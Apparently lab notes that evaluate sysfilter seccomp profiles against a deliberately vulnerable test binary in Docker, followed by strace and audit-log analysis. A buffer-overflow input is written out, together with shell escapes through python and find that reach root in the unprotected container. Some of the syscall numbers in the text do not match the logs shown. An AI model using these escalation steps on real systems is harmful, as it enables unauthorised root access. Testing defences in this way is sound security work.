## Custom – sysfilter

### Preparation

#### System Calls Extraction

_Extract the syscalls from the binary `custom_app` into `/tmp/app.json`_

```
docker exec -it custom-sysfilter-seccomp-container bash -c "/sysfilter/extraction/app/sysfilter_extract /app/custom_app -o /tmp/app.json"
```

#### Seccomp Profile enforcement

_Enforce the allowed syscalls for the binary `custom_app`_

```
docker exec -it custom-sysfilter-seccomp-container bash -c "/sysfilter/enforcement/sysfilter_enforce /app/custom_app /tmp/app.json"
```

#### Starting containers

It is not neccessary to start the app/container.
Just enter the containers with the command `bash`.

```
docker exec -it custom-sysfilter-seccomp-container bash
docker exec -it custom-chestnut-seccomp-container bash
```

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID   IMAGE                      COMMAND       CREATED          STATUS          PORTS                                                                                  NAMES
76b9e25b31d8   custom-sysfilter-normal    "/bin/bash"   11 minutes ago   Up 11 minutes                                                                                          custom-sysfilter-normal-container
d400d5b35097   custom-sysfilter-seccomp   "/bin/bash"   11 minutes ago   Up 11 minutes
```

Note: the attacks are executed inside each container. The script `attack.sh` is in the current directory.

_seccomp_
The attack on the container with the applied seccomp profile fails almost completely for binaries which could be dangerous. However, execution of the binaries `/bin/pwd` and `/bin/true` is still possible! There is a chance that other binaries might aswell execute successfully.

```
user@898919bd1119:/app$ ./custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
locals.path = [/bin/sh]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh]
Bad system call (core dumped)
user@898919bd1119:/app$ ./custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/python3.6
locals.path = [/usr/bin/python3.6]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/python3.6]
Bad system call (core dumped)
user@898919bd1119:/app$ ./custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/find
locals.path = [/usr/bin/find]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/find]
Bad system call (core dumped)
user@898919bd1119:/bin$ /app/custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/pwd
locals.path = [/bin/pwd]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/pwd]
/bin/pwd: ignoring non-option arguments
/bin
```

_Normal_
The attack on the container without the seccomp profile succeeds. We are able to run arbitrary commands:

```
user@55a5a57f43fe:/app$ ./custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
locals.path = [/bin/sh]
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ true
$ uname
Linux
$ /usr/bin/python3.6 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
# /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
```

### Analysis

As the exploit worked on the container without the seccomp profile, only the one with the enforced profile will be analysed.

_strace output:_
When starting the application with the command `strace -f /app/custom_app` we are able to see that just before the process was killed with the signal `SIGSYS`, the system call `getuid` and `set_tid_address` were executed.

```
# /bin/sh execution
...
munmap(0x7e38708aa000, 20804)           = 0
getuid()                                = 102
+++ killed by SIGSYS (core dumped) +++
Bad system call (core dumped)

# /usr/bin/id execution
...
munmap(0x70baca458000, 20804)           = 0
set_tid_address(0x70baca455310)         = 218
+++ killed by SIGSYS (core dumped) +++
Bad system call (core dumped)

# /usr/bin/python3.6 execution
...
munmap(0x778f17b54000, 20804)           = 0
set_tid_address(0x778f17b4da10)         = 218
+++ killed by SIGSYS (core dumped) +++
Bad system call (core dumped)

# /usr/bin/find execution
...
munmap(0x70f3357e9000, 20804)           = 0
set_tid_address(0x70f3357e2ad0)         = 218
+++ killed by SIGSYS (core dumped) +++
Bad system call (core dumped)
```

Further analysis on the host machine with the tool `ausearch` delievers us more insights.
As we can see, the syscall with the number 158 was the reason for the `SIGSYS` signal.

```
# /bin/sh execution
time->Mon Apr 28 18:14:18 2025
type=SECCOMP msg=audit(1745857458.872:21766): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=196887 comm="sh" exe="/bin/dash" sig=31 arch=c000003e syscall=102 compat=0 ip=0x707bebe1c837 code=0x0
----
# /usr/bin/id execution
time->Mon Apr 28 18:14:51 2025
type=SECCOMP msg=audit(1745856891.891:21575): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=193146 comm="id" exe="/usr/bin/id" sig=31 arch=c000003e syscall=218 compat=0 ip=0x721ba9628eb5 code=0x0
----
# /usr/bin/python3.6 execution
time->Mon Apr 28 18:15:01 2025
type=SECCOMP msg=audit(1745856901.383:21585): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=193209 comm="python3.6" exe="/usr/bin/python3.6" sig=31 arch=c000003e syscall=218 compat=0 ip=0x780ae044eeb5 code=0x0
----
# /usr/bin/find execution
time->Mon Apr 28 18:15:07 2025
type=SECCOMP msg=audit(1745856907.759:21595): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=193247 comm="find" exe="/usr/bin/find" sig=31 arch=c000003e syscall=218 compat=0 ip=0x71cdcf375eb5 code=0x0
```

We verify that the system call number `218` maps to `set_tid_address` with the `ausyscall` tool:

```
218	set_tid_address
```

The last thing we check is, if the system call number `218` was in the applied seccomp profile. The file `/tmp/app.json` shows no presence:

```
[0,1,3,4,5,6,7,8,9,10,11,12,13,14,15,16,20,24,25,28,32,39,41,42,44,45,47,49,51,54,59,60,62,72,78,79,96,99,186,201,202,228,229,231,234,257,262,302,21,158,221]
```

## Appendix

The following shows the time needed to extract the system calls from 3 runs:

```
❯ docker exec -it custom-sysfilter-seccomp-container bash -c "time /sysfilter/extraction/app/sysfilter_extract /app/custom_app -o /tmp/app.json"
real	0m4.298s
user	0m4.167s
sys	0m0.115s

❯ docker exec -it custom-sysfilter-seccomp-container bash -c "time /sysfilter/extraction/app/sysfilter_extract /app/custom_app -o /tmp/app.json"
real	0m4.122s
user	0m3.992s
sys	0m0.117s

❯ docker exec -it custom-sysfilter-seccomp-container bash -c "time /sysfilter/extraction/app/sysfilter_extract /app/custom_app -o /tmp/app.json"
real	0m4.325s
user	0m4.187s
sys	0m0.120s
```

`(4,298+4,122+4,325)/3=4,248`

### Missing system calls

Following system calls are not detected by sysfilter, but needed for the application to start successfully, therefore we added these two to the seccomp-profile `/tmp/app.json`. This is not sysfilters fault for not recognising the required system call, but rather a side-effect of the application logic calling a binary outside the application.

- 21 (access)
- 158 (arch_prctl)
- 221 (fadvise64)

```
sed -i '0,/\]/s/\]/,21,158,221]/' /tmp/app.json
```

### Number of system calls

```
python3 -c "print(len([0,1,3,4,5,6,7,8,9,10,11,12,13,14,15,16,20,24,25,28,32,39,41,42,44,45,47,49,51,54,59,60,62,72,78,79,96,99,186,201,202,228,229,231,234,257,262,302]))"
48
```
